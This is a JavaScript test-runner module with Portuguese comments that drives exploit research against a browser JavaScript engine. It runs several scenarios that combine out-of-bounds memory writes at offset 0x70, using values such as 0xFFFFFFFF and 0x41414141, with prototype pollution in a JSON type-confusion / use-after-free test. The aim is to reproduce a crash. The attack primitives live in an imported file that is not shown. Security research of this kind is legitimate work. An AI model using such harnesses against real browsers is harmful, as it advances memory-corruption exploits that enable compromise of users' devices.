// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';

import { runSpecificJsonTypeConfusionTest } from './testJsonTypeConfusionUAFSpeculative.mjs';
// Adicione outras importações de teste do script3 se necessário
// import { testWebAssemblyInterface } from './testWebAssemblyInterface.mjs';
// ...

async function runTargetedJsonTC_With_SimpleToJSON() {
    const FNAME_RUNNER = "runTargetedJsonTC_With_SimpleToJSON";
    logS3(`==== INICIANDO TESTES DIRECIONADOS JSON TC (toJSON com lógica SIMPLES) ====`, 'test', FNAME_RUNNER);

    // Cenário 1: Tentar recriar o crash original (OOB write + PP),
    // mas com a lógica toJSON simplificada (sem controle de profundidade para retorno primitivo).
    // O objetivo é ver se o crash OOB acontece ANTES de um estouro de pilha.
    await runSpecificJsonTypeConfusionTest(
        "OOB_0x70_FFFF_PP_toJSON_SimpleLogic",
        0x70,       // corruptionOffset
        0xFFFFFFFF, // valueToWrite
        true,       // enablePP
        true,       // attemptOOBWrite
        false       // skipOOBEnvironmentSetup (configura ambiente OOB)
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // Cenário 2: Apenas PP (sem escrita OOB), com toJSON usando lógica SIMPLES.
    // Este cenário provavelmente causará o RangeError (estouro de pilha) se não for interrompido.
    logS3("Próximo teste: APENAS PP com toJSON simples. ESPERADO: RangeError (Estouro de Pilha) ou lentidão extrema.", "warn", FNAME_RUNNER);
    await runSpecificJsonTypeConfusionTest(
        "OnlyPP_toJSON_SimpleLogic_NoOOBWrite",
        -1,         // corruptionOffset (inválido -> sem escrita OOB efetiva)
        0,          // valueToWrite (irrelevante)
        true,       // enablePP
        false,      // attemptOOBWrite (explicitamente desabilitado)
        false       // skipOOBEnvironmentSetup (ambiente OOB é configurado, mas não usado para escrita)
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    
    // Cenário 3: OOB Write com VALOR NULO (0x0) em 0x70, PP com toJSON simples.
    await runSpecificJsonTypeConfusionTest(
        "OOB_0x70_NULL_PP_toJSON_SimpleLogic",
        0x70,       // corruptionOffset
        0x0,        // valueToWrite
        true,       // enablePP
        true,       // attemptOOBWrite
        false       // skipOOBEnvironmentSetup
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    // Cenário 4: OOB Write com VALOR PADRÃO (0x41414141) em 0x70, PP com toJSON simples.
    await runSpecificJsonTypeConfusionTest(
        "OOB_0x70_AAAA_PP_toJSON_SimpleLogic",
        0x70,       // corruptionOffset
        0x41414141, // valueToWrite
        true,       // enablePP
        true,       // attemptOOBWrite
        false       // skipOOBEnvironmentSetup
    );
    await PAUSE_S3(MEDIUM_PAUSE_S3);


    logS3(`==== TESTES DIRECIONADOS JSON TC (toJSON com lógica SIMPLES) CONCLUÍDOS ====`, 'test', FNAME_RUNNER);
}


export async function runAllAdvancedTestsS3() {
    const FNAME = 'runAllAdvancedTestsS3_FocusJsonTC_SimpleToJSON';
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== INICIANDO Script 3: Foco JSON TC (toJSON com lógica SIMPLES) ====`,'test', FNAME);
    
    await runTargetedJsonTC_With_SimpleToJSON();

    // Outros testes do Script 3 podem ser adicionados ou descomentados aqui se necessário
    // logS3("Outros testes do Script 3 (se houver) seriam executados agora...", "info", FNAME);

    logS3(`\n==== Script 3 CONCLUÍDO (Foco JSON TC com lógica SIMPLES) ====`,'test', FNAME);
    if (runBtn) runBtn.disabled = false;
}
